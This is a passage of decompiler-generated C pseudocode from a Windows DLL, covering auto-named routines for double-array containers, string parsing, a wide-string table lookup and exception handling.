  int v11; // [esp+44h] [ebp-4h]

  v3 = a2 + 2;
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, void *))(a2[2] + 8))(a2 + 2, a1) )
  {
    if ( *(_BYTE *)((*(int (__thiscall **)(_DWORD *, void *))(*v3 + 16))(a2 + 2, a1) + 17) )
      return;
    *(_BYTE *)((*(int (__thiscall **)(_DWORD *, void *))(*v3 + 16))(a2 + 2, a1) + 17) = 1;
  }
  sub_10048BE6((__int32)&v9, (int)a2, &v9, a1);
  if ( (void *)dword_10186DB0 != v9 || dword_10186DB4 != v10 )
  {
    v4 = sub_10046B33(dword_10186F24, a2 + 39, (int)v9, v10);
    if ( v4 != -1 )
    {
      v5 = sub_1004624E(a2 + 39, v4 + dword_10186F30);
      sub_1004664E(a2 + 39, v7, v5);
      v11 = 0;
      sub_10045E73((__int32)v8, a2 + 39, v8, v7);
      LOBYTE(v11) = 1;
      sub_10037CF0(v8, (int)&v9);
      LOBYTE(v11) = 2;
      while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v9 + 4))(v9) )
      {
        v6 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v9 + 12))(v9);
        sub_100499E5(v6, a2);
        sub_10042AAB((int)v9);
      }
      LOBYTE(v11) = 1;
      sub_1003406C(&v9);
      LOBYTE(v11) = 0;
      sub_10032EA8(v8);
      v11 = -1;
      sub_10032EA8(v7);
    }
  }
}
// 10186DB0: using guessed type int dword_10186DB0;
// 10186DB4: using guessed type int dword_10186DB4;
// 10186F24: using guessed type _DWORD dword_10186F24[3];
// 10186F30: using guessed type int dword_10186F30;
// 100498D6: using guessed type _DWORD var_38[4];
// 100498D6: using guessed type _DWORD var_28[4];

//----- (100499E5) --------------------------------------------------------
void *__usercall sub_100499E5@<eax>(_DWORD *a1@<ecx>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // edx
  int v3; // ecx
  int v5; // [esp-Ch] [ebp-B4h]
  _DWORD *v6; // [esp-8h] [ebp-B0h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-ACh]
  int v8[26]; // [esp+10h] [ebp-98h] BYREF
  char v9[32]; // [esp+78h] [ebp-30h] BYREF
  int *v10; // [esp+98h] [ebp-10h]
  int v11; // [esp+A4h] [ebp-4h]

  sub_1001AEB1(a1, (int)v9);
  v11 = 0;
  v2 = (volatile LONG *)a2[33];
  v6 = a2 + 32;
  v7 = v2;
  v3 = a2[32];
  v10 = (int *)&v6;
  v6 = (_DWORD *)v3;
  InterlockedIncrement(v2);
  LOBYTE(v11) = 1;
  v5 = a2[31];
  LOBYTE(v11) = 0;
  sub_100454FE(v9, (int)v8, v5, (int)v6, v7);
  LOBYTE(v11) = 2;
  sub_10049A8F(a2, v8, dword_10186EFC, dword_10187028, (void *)1);
  sub_10049A8F(a2, v8, dword_10187064, dword_10186FAC, 0);
  LOBYTE(v11) = 0;
  sub_10036C70((int)v8);
  v11 = -1;
  return sub_1001AF12((int)v9);
}
// 10186EFC: using guessed type _DWORD dword_10186EFC[5];
// 10186FAC: using guessed type _DWORD dword_10186FAC[5];
// 10187028: using guessed type _DWORD dword_10187028[5];
// 10187064: using guessed type _DWORD dword_10187064[5];

//----- (10049A8F) --------------------------------------------------------
void __stdcall sub_10049A8F(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, void *a5)
{
  int *v5; // eax
  int v6; // esi
  int *v7; // eax
  int v8; // edi
  int v9; // ecx
  int i; // [esp-8h] [ebp-3Ch] BYREF
  int v11; // [esp-4h] [ebp-38h]
  int v12; // [esp+10h] [ebp-24h] BYREF
  int v13; // [esp+18h] [ebp-1Ch] BYREF
  int v14; // [esp+20h] [ebp-14h] BYREF
  int v15[3]; // [esp+24h] [ebp-10h] BYREF
  int v16; // [esp+30h] [ebp-4h]

  v11 = dword_10186E48;
  for ( i = dword_10186E44; ; i = *v7 )
  {
    v8 = sub_10046B33(a3, a2, i, v11);
    if ( v8 == -1 )
      break;
    sub_1004A363(a1);
    v5 = sub_10045454(0x7FFFFFFF, v8, &v13);
    v6 = sub_10046B33(a4, a2, *v5, v5[1]);
    if ( v6 == -1 )
    {
      sub_10029BC2(-1);
      sub_1000D17D(&v14, &word_101749CC);
      v16 = 0;
      v11 = v9;
      i = v9;
      sub_1000728E(&i, 0);
      LOBYTE(v16) = 0;
      sub_1004F292((_DWORD *)dword_10182DE8, 122, (int)&v14, i, v11);
      v16 = -1;
      sub_1000D3AD(&v14);
      return;
    }
    v15[0] = v8 + a3[3];
    while ( v15[0] < v6 )
    {
      if ( (_BYTE)a5 )
        sub_10049B9A(v15, (int)a1, a2);
      else
        sub_10049C76(a2, (int)a1, v15);
    }
    v7 = sub_10045454(0x7FFFFFFF, a4[3] + v6, &v12);
    v11 = v7[1];
  }
}
// 10049B5F: variable 'v9' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 10186E44: using guessed type int dword_10186E44;
// 10186E48: using guessed type int dword_10186E48;

//----- (10049B9A) --------------------------------------------------------
void __thiscall sub_10049B9A(int *this, int a2, _DWORD *a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v8[5]; // [esp+10h] [ebp-58h] BYREF
  int v9[5]; // [esp+24h] [ebp-44h] BYREF
  int v10[2]; // [esp+38h] [ebp-30h] BYREF
  int v11[2]; // [esp+40h] [ebp-28h] BYREF
  int v12[2]; // [esp+48h] [ebp-20h] BYREF
  int v13[5]; // [esp+50h] [ebp-18h] BYREF
  int v14; // [esp+64h] [ebp-4h]

  *this = sub_1004624E(a3, *this);
  sub_10049F4B(this, v8, a3);
  v14 = 0;
  sub_10049F4B(this, v9, a3);
  LOBYTE(v14) = 1;
  v4 = sub_1000D2FA(v10, 0);
  LOBYTE(v14) = 2;
  v5 = sub_1004A04D(v11, (int)v4);
  LOBYTE(v14) = 3;
  v6 = sub_1000D2FA(v12, 0);
  LOBYTE(v14) = 4;
  v7 = sub_1004A04D(v13, (int)v6);
  LOBYTE(v14) = 5;
  (*(void (__thiscall **)(int, _DWORD *, _DWORD *))(*(_DWORD *)(a2 + 44) + 24))(a2 + 44, v7, v5);
  LOBYTE(v14) = 4;
  sub_1000D3AD(v13);
  LOBYTE(v14) = 3;
  sub_1000D3AD(v12);
  LOBYTE(v14) = 2;
  sub_1000D3AD(v11);
  LOBYTE(v14) = 1;
  sub_1000D3AD(v10);
  LOBYTE(v14) = 0;
  sub_1000B3DF(v9);
  v14 = -1;
  sub_1000B3DF(v8);
}
// 10049B9A: using guessed type int var_58[5];
// 10049B9A: using guessed type int var_44[5];
// 10049B9A: using guessed type int var_18[5];

//----- (10049C76) --------------------------------------------------------
int __userpurge sub_10049C76@<eax>(_DWORD *a1@<edi>, int a2, int *a3)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  unsigned int v5; // esi
  int v6; // esi
  int *v7; // eax
  _DWORD *v8; // eax
  int v9; // esi
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  int v13; // esi
  int v14; // ebx
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  int result; // eax
  int v19[5]; // [esp+10h] [ebp-60h] BYREF
  int v20[2]; // [esp+24h] [ebp-4Ch] BYREF
  int v21[2]; // [esp+2Ch] [ebp-44h] BYREF
  int v22[2]; // [esp+34h] [ebp-3Ch] BYREF
  int v23[2]; // [esp+3Ch] [ebp-34h] BYREF
  _DWORD *v24; // [esp+44h] [ebp-2Ch]
  int v25; // [esp+48h] [ebp-28h] BYREF
  int v26; // [esp+4Ch] [ebp-24h]
  unsigned int v27; // [esp+50h] [ebp-20h]
  unsigned int v28; // [esp+54h] [ebp-1Ch]
  int v29; // [esp+58h] [ebp-18h] BYREF
  bool v30; // [esp+5Fh] [ebp-11h]
  int v31; // [esp+6Ch] [ebp-4h]
  int v32; // [esp+78h] [ebp+8h]
  unsigned int v33; // [esp+78h] [ebp+8h]

  v29 = sub_1004624E(a1, *a3);
  sub_10049F4B(&v29, v19, a1);
  v31 = 0;
  v3 = sub_1000D2FA(v23, 0);
  LOBYTE(v31) = 1;
  v27 = sub_1000D80E((int)v3);
  LOBYTE(v31) = 0;
  sub_1000D3AD(v23);
  v31 = -1;
  sub_1000B3DF(v19);
  sub_10049F4B(&v29, v19, a1);
  v31 = 2;
  v4 = sub_1000D2FA(v23, 0);
  LOBYTE(v31) = 3;
  v5 = sub_1000D80E((int)v4);
  LOBYTE(v31) = 2;
  sub_1000D3AD(v23);
  v31 = -1;
  sub_1000B3DF(v19);
  v28 = v5 - v27 + 1;
  v6 = v29;
  v7 = sub_10045454(v29 + 1, v29, v20);
  v8 = sub_10046723(a1, v19, *v7, v7[1]);
  v31 = 4;
  v30 = sub_1000B4E7(dword_10186FC0, v8);
  v31 = -1;
  sub_1000B3DF(v19);
  if ( v30 )
  {
    v29 = sub_1004624E(a1, v6 + dword_10186FCC);
    v26 = 0;
    if ( v28 )
    {
      v32 = a2 + 44;
      do
      {
        sub_10049F4B(&v29, v19, a1);
        v31 = 5;
        sub_1000D2FA(v23, 0);
        LOBYTE(v31) = 7;
        sub_1000B3DF(v19);
        v24 = sub_1004A04D(v20, (int)v23);
        LOBYTE(v31) = 8;
        v9 = v26;
        v10 = sub_1000D74C(v21, v26 + v27);
        LOBYTE(v31) = 9;
        v11 = sub_1004A04D(v22, (int)v10);
        LOBYTE(v31) = 10;
        (*(void (__thiscall **)(int, _DWORD *, _DWORD *))(*(_DWORD *)v32 + 24))(v32, v11, v24);
        LOBYTE(v31) = 9;
        sub_1000D3AD(v22);
        LOBYTE(v31) = 8;
        sub_1000D3AD(v21);
        LOBYTE(v31) = 7;
        sub_1000D3AD(v20);
        v31 = -1;
        sub_1000D3AD(v23);
        v26 = v9 + 1;
      }
      while ( v9 + 1 < v28 );
    }
    ++v29;
  }
  else
  {
    sub_10049F4B(&v29, v19, a1);
    v31 = 11;
    v12 = sub_1000D2FA(v20, 0);
    LOBYTE(v31) = 12;
    v13 = sub_1000D80E((int)v12);
    LOBYTE(v31) = 11;
    sub_1000D3AD(v20);
    v31 = -1;
    sub_1000B3DF(v19);
    if ( v28 )
    {
      v14 = a2 + 44;
      v15 = (_DWORD *)(v27 - v13);
      v24 = (_DWORD *)(v27 - v13);
      v33 = v28;
      while ( 1 )
      {
        v16 = sub_1000D74C(v20, (int)v15 + v13);
        v31 = 13;
        sub_1004A04D(&v25, (int)v16);
        LOBYTE(v31) = 15;
        sub_1000D3AD(v20);
        v17 = sub_1000D74C(v21, v13);
        LOBYTE(v31) = 16;
        sub_1004A04D(v23, (int)v17);
        LOBYTE(v31) = 18;
        sub_1000D3AD(v21);
        (*(void (__thiscall **)(int, int *, int *))(*(_DWORD *)v14 + 24))(v14, &v25, v23);
        LOBYTE(v31) = 15;
        sub_1000D3AD(v23);
        v31 = -1;
        sub_1000D3AD(&v25);
        ++v13;
        if ( !--v33 )
          break;
        v15 = v24;
      }
    }
  }
  result = sub_1004624E(a1, v29);
  *a3 = result;
  return result;
}
// 10186FC0: using guessed type _DWORD dword_10186FC0[3];
// 10186FCC: using guessed type int dword_10186FCC;
// 10049C76: using guessed type int var_18;
// 10049C76: using guessed type int var_60[5];

//----- (10049F4B) --------------------------------------------------------
void *__userpurge sub_10049F4B@<eax>(int *a1@<esi>, void *a2, _DWORD *a3)
{
  int *v3; // eax
  _DWORD *v4; // eax
  bool v5; // bl
  _DWORD *v6; // eax
  int v7; // ebx
  int *v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // ecx
  int *v12; // eax
  int v14[6]; // [esp+10h] [ebp-30h] BYREF
  int v15; // [esp+28h] [ebp-18h] BYREF
  int v16; // [esp+2Ch] [ebp-14h]
  int v17; // [esp+3Ch] [ebp-4h]

  v14[5] = 0;
  v3 = sub_10045454(*a1 + 1, *a1, &v15);
  v4 = sub_10046723(a3, v14, *v3, v3[1]);
  v17 = 1;
  v5 = !sub_1000B4E7(dword_10186F98, v4);
  LOBYTE(v17) = 0;
  sub_1000B3DF(v14);
  if ( v5 )
  {
    v6 = sub_1000E7F7(&a3, 1, 0);
    v17 = 2;
    goto LABEL_3;
  }
  v7 = *a1;
  v8 = sub_10045454(*a1 + 20, *a1, &v15);
  v9 = sub_10046B33(dword_10186FFC, a3, *v8, v8[1]);
  v16 = v9;
  if ( v9 == -1 )
  {
    v6 = sub_1000E7F7(&a3, 1, 0);
    v17 = 3;
LABEL_3:
    sub_10007882((int)v6);
  }
  v10 = sub_1004624E(a3, v9 + dword_10187008);
  v11 = v16;
  *a1 = v10;
  v12 = sub_10045454(v11, dword_10186FA4 + v7, &v15);
  sub_10046723(a3, a2, *v12, v12[1]);
  return a2;
}
// 10186F98: using guessed type _DWORD dword_10186F98[3];
// 10186FA4: using guessed type int dword_10186FA4;
// 10186FFC: using guessed type _DWORD dword_10186FFC[3];
// 10187008: using guessed type int dword_10187008;

//----- (1004A04D) --------------------------------------------------------
_DWORD *__cdecl sub_1004A04D(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  bool v3; // zf
  LONG v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  LONG *v7; // eax
  int v9[2]; // [esp+10h] [ebp-30h] BYREF
  int v10[2]; // [esp+18h] [ebp-28h] BYREF
  int v11; // [esp+20h] [ebp-20h] BYREF
  int v12; // [esp+24h] [ebp-1Ch]
  int v13; // [esp+28h] [ebp-18h] BYREF
  LONG v14; // [esp+2Ch] [ebp-14h] BYREF
  int v15; // [esp+30h] [ebp-10h]
  int v16; // [esp+3Ch] [ebp-4h]

  v15 = 0;
  sub_1000D17D(&v11, a0000);
  v16 = 1;
  sub_1000D372(&v13, a2);
  LOBYTE(v16) = 2;
  while ( 1 )
  {
    v3 = !sub_1000E007((int)&v13, (int)&v11);
    v4 = v14;
    if ( v3 )
      break;
    v2 = sub_1000D836(*(_DWORD *)(v14 + 28) - *(_DWORD *)(v12 + 28), (int)&v13, v10, *(_DWORD *)(v12 + 28));
    LOBYTE(v16) = 3;
    sub_10001236(v2 + 1, &v14);
    LOBYTE(v16) = 2;
    sub_1000D3AD(v10);
  }
  while ( (*(_BYTE *)(v4 + 28) & 3) != 0 )
  {
    v5 = sub_1000D17D(v9, a0);
    LOBYTE(v16) = 4;
    v6 = sub_1000D5FF(v10, (int)v5, &v13);
    LOBYTE(v16) = 5;
    sub_10001236(v6 + 1, &v14);
    LOBYTE(v16) = 4;
    sub_1000D3AD(v10);
    LOBYTE(v16) = 2;
    sub_1000D3AD(v9);
    v4 = v14;
  }
  v7 = sub_1000D984(&v13);
  sub_1000D372(a1, (int)v7);
  v15 = 1;
  LOBYTE(v16) = 1;
  sub_1000D3AD(&v13);
  LOBYTE(v16) = 0;
  sub_1000D3AD(&v11);
  return a1;
}

//----- (1004A152) --------------------------------------------------------
unsigned int __cdecl sub_1004A152(int a1)
{
  int v1; // esi
  _DWORD *v2; // eax
  int v3; // esi
  _DWORD *v4; // eax
  int v5; // edi
  int v6; // esi
  int v7; // eax
  _DWORD *v8; // eax
  unsigned int v9; // esi
  int *v10; // ecx
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  _DWORD v15[2]; // [esp+10h] [ebp-34h] BYREF
  _DWORD v16[2]; // [esp+18h] [ebp-2Ch] BYREF
  int v17; // [esp+20h] [ebp-24h] BYREF
  LONG v18; // [esp+24h] [ebp-20h] BYREF
  int v19; // [esp+28h] [ebp-1Ch] BYREF
  int v20; // [esp+2Ch] [ebp-18h] BYREF
  bool v21; // [esp+33h] [ebp-11h]
  int v22; // [esp+40h] [ebp-4h]

  sub_1000D372(&v17, a1);
  v22 = 0;
  sub_1000D17D(&v19, asc_101749E0);
  LOBYTE(v22) = 1;
  v1 = sub_1000DF11(0, (int)&v17, (int)&v19);
  v21 = v1 != -1;
  LOBYTE(v22) = 0;
  sub_1000D3AD(&v19);
  if ( v21 )
  {
    v2 = sub_1000D836(v1, (int)&v17, &v19, 0);
    LOBYTE(v22) = 2;
    sub_10001236(v2 + 1, &v18);
    LOBYTE(v22) = 0;
    sub_1000D3AD(&v19);
  }
  sub_1000D17D(&v19, asc_101749E4);
  LOBYTE(v22) = 3;
  v3 = sub_1000DF11(0, (int)&v17, (int)&v19);
  v21 = v3 != -1;
  LOBYTE(v22) = 0;
  sub_1000D3AD(&v19);
  if ( v21 )
  {
    v4 = sub_1000D836(v3, (int)&v17, &v19, 0);
    LOBYTE(v22) = 4;
    sub_10001236(v4 + 1, &v18);
    LOBYTE(v22) = 0;
    sub_1000D3AD(&v19);
  }
  v5 = 0;
  v20 = 4280;
  do
  {
    v6 = (v20 + v5) >> 1;
    v7 = wcscmp(*(const wchar_t **)(v18 + 12), *(const wchar_t **)(dword_101870A4[3 * v6] + 12));
    if ( v7 >= 0 )
    {
      if ( v7 <= 0 )
      {
        v9 = dword_101870A8[3 * v6];
        goto LABEL_15;
      }
      v5 = v6 + 1;
    }
    else
    {
      v20 = v6 - 1;
    }
  }
  while ( v5 <= v20 );
  if ( sub_1000E007((int)&v17, (int)&unk_10186F4C) )
  {
    v8 = sub_1000D836(-2, (int)&v17, &v19, *(_DWORD *)(dword_10186F50 + 28));
    LOBYTE(v22) = 5;
    v9 = sub_1000D80E((int)v8);
    LOBYTE(v22) = 0;
    v10 = &v19;
  }
  else if ( sub_1000E007((int)&v17, (int)&unk_10187020) )
  {
    v12 = sub_1000D836(-2, (int)&v17, v16, *(_DWORD *)(dword_10187024 + 28));
    LOBYTE(v22) = 6;
    v9 = sub_1000D80E((int)v12);
    LOBYTE(v22) = 0;
    v10 = v16;
  }
  else
  {
    if ( !sub_1000E007((int)&v17, (int)&unk_1019394C) )
    {
      v14 = sub_1000E7F7(&v20, 1, 0);
      LOBYTE(v22) = 8;
      sub_10007882((int)v14);
    }
    v13 = sub_1000D836(-2, (int)&v17, v15, *(_DWORD *)(dword_10193950 + 28));
    LOBYTE(v22) = 7;
    v9 = sub_1000D822((int)v13);
    LOBYTE(v22) = 0;
    v10 = v15;
  }
  sub_1000D3AD(v10);
LABEL_15:
  v22 = -1;
  sub_1000D3AD(&v17);
  return v9;
}
// 10186F50: using guessed type int dword_10186F50;
// 10187024: using guessed type int dword_10187024;
// 101870A4: using guessed type int dword_101870A4[];
// 101870A8: using guessed type int dword_101870A8[];
// 10193950: using guessed type int dword_10193950;
// 1004A152: using guessed type int var_18;
// 1004A152: using guessed type _DWORD var_2C[2];
// 1004A152: using guessed type _DWORD var_34[2];

//----- (1004A363) --------------------------------------------------------
char __thiscall sub_1004A363(_DWORD *this)
{
  void *v2; // eax
  int v3; // ecx
  const struct Concurrency::SchedulerPolicy *v4; // eax
  _DWORD *v5; // edi
  const struct Concurrency::SchedulerPolicy *v6; // eax
  int v8; // [esp-8h] [ebp-2Ch] BYREF
  int v9; // [esp-4h] [ebp-28h]
  int v10; // [esp+Ch] [ebp-18h] BYREF
  int pExceptionObject[2]; // [esp+10h] [ebp-14h] BYREF
  int v12; // [esp+20h] [ebp-4h]

  v2 = (void *)this[31];
  if ( v2 )
  {
    v2 = (void *)WaitForSingleObjectEx(v2, 0, 1);
    if ( v2 != (void *)258 )
    {
      sub_10029BC2((__int32)v2);
      v9 = v3;
      v8 = v3;
      pExceptionObject[0] = (int)&v8;
      sub_1000728E(&v8, 0);
      v12 = -1;
      sub_1004F292((_DWORD *)dword_10182DE8, 13, (int)(this + 29), v8, v9);
      v4 = (const struct Concurrency::SchedulerPolicy *)sub_1004548C(pExceptionObject);
      v12 = 1;
      v9 = 906;
      sub_100470BB(v4);
    }
  }
  v5 = (_DWORD *)this[32];
  if ( v5 )
  {
    LOBYTE(v2) = sub_10022997(v5);
    if ( (_BYTE)v2 )
    {
      v6 = (const struct Concurrency::SchedulerPolicy *)sub_1003592A(&v10);
      v12 = 2;
      Concurrency::details::ThreadScheduler::ThreadScheduler(
        (Concurrency::details::ThreadScheduler *)pExceptionObject,
        v6);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVCdxOxsdsctwnrVpjjoacDxoxsdsct_BurqUpfqufhkrx_wvnem__);
    }
  }
  return (char)v2;
}
// 1004A3AE: variable 'v3' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1004A44E) --------------------------------------------------------
int __thiscall sub_1004A44E(int this, int a2)
{
  sub_10037CF0((void *)(this + 4), a2);
  return a2;
}

//----- (1004A47F) --------------------------------------------------------
_DWORD *__thiscall sub_1004A47F(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x28u);
  if ( v3 )
    v4 = sub_1004A4F0(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (1004A4F0) --------------------------------------------------------
_DWORD *__stdcall sub_1004A4F0(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_101041A4;
  a1[2] = off_10104144;
  sub_1000D17D(a1 + 6, (wchar_t *)&word_10102960);
  a1[8] = 0;
  return a1;
}
// 10104144: using guessed type int (__thiscall *off_10104144[2])(void *Block, char);
// 101041A4: using guessed type int (__stdcall *off_101041A4)(char);

//----- (1004A53E) --------------------------------------------------------
int __thiscall sub_1004A53E(int this)
{
  double v2; // st7
  int v3; // eax
  int v4; // eax

  v2 = *(double *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                    *(_DWORD *)(this + 4) + 4,
                    *(_DWORD *)(this + 32));
  v3 = *(_DWORD *)(this + 4);
  *(double *)(this + 16) = v2;
  v4 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(v3 + 20) + 44))(v3 + 20, *(_DWORD *)(this + 32));
  sub_10001236((LONG *)(v4 + 4), (LONG *)(this + 28));
  return this + 8;
}

//----- (1004A572) --------------------------------------------------------
void __thiscall sub_1004A572(_DWORD *this)
{
  ++this[8];
}

//----- (1004A576) --------------------------------------------------------
void __thiscall sub_1004A576(_DWORD *this)
{
  --this[8];
}

//----- (1004A57A) --------------------------------------------------------
void __thiscall sub_1004A57A(int *this)
{
  *this = (int)off_10104144;
  sub_1000D3AD(this + 4);
}
// 10104144: using guessed type int (__thiscall *off_10104144[2])(void *Block, char);

//----- (1004A5A1) --------------------------------------------------------
int *__thiscall sub_1004A5A1(int *this, char a2)
{
  sub_1004A57A(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1004A5D5) --------------------------------------------------------
int *__thiscall sub_1004A5D5(int *Block, char a2)
{
  sub_1004A57A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004A5F1) --------------------------------------------------------
void __thiscall sub_1004A5F1(int this)
{
  *(_DWORD *)this = &off_10104148;
  j_j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_10039F05((_DWORD *)this);
}
// 10104148: using guessed type int (__thiscall *off_10104148)(void *Block, char);

//----- (1004A640) --------------------------------------------------------
int __thiscall sub_1004A640(_DWORD *this, double *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  double *v7; // ecx
  int result; // eax
  double v9; // [esp+8h] [ebp-8h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10130AF2);
  v4 = *this;
  v9 = *a2;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
  {
    v7 = (double *)(this[3] + 8 * i);
    *v7 = *(v7 - 1);
  }
  result = this[3];
  *(double *)(result + 8 * a3) = v9;
  ++this[1];
  return result;
}

//----- (1004A6A5) --------------------------------------------------------
int __thiscall sub_1004A6A5(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  double *v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10130AF3);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (double *)(this[3] + 8 * v2++);
    *v4 = v4[1];
  }
  *(double *)(this[3] + 8 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0.0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1004A6EF) --------------------------------------------------------
int __thiscall sub_1004A6EF(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10130AFE);
  return this[3] + 8 * a2;
}

//----- (1004A70D) --------------------------------------------------------
int __thiscall sub_1004A70D(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10130AFF);
  return this[3] + 8 * a2;
}

//----- (1004A72B) --------------------------------------------------------
void __thiscall sub_1004A72B(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j_j__free(v2);
  }
}

//----- (1004A74D) --------------------------------------------------------
int __thiscall sub_1004A74D(void **this)
{
  void *v2; // edx
  int result; // eax

  j_j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1004A771) --------------------------------------------------------
int __thiscall sub_1004A771(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(double *)(this[3] + 8 * i) = 0.0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1004A7B1) --------------------------------------------------------
unsigned int __thiscall sub_1004A7B1(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10130B09);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1004A823) --------------------------------------------------------
unsigned int __thiscall sub_1004A823(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(8 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(double *)(this[3] + 8 * v6) = *(double *)(a3 + 8 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (1004A880) --------------------------------------------------------
void __thiscall sub_1004A880(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  double *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  double *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = (double *)operator new(8 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(double *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j_j__free(Block);
    this[2] = v11;
  }
}

//----- (1004A936) --------------------------------------------------------
_DWORD *__stdcall sub_1004A936(_DWORD *a1)
{
  unsigned int i; // eax

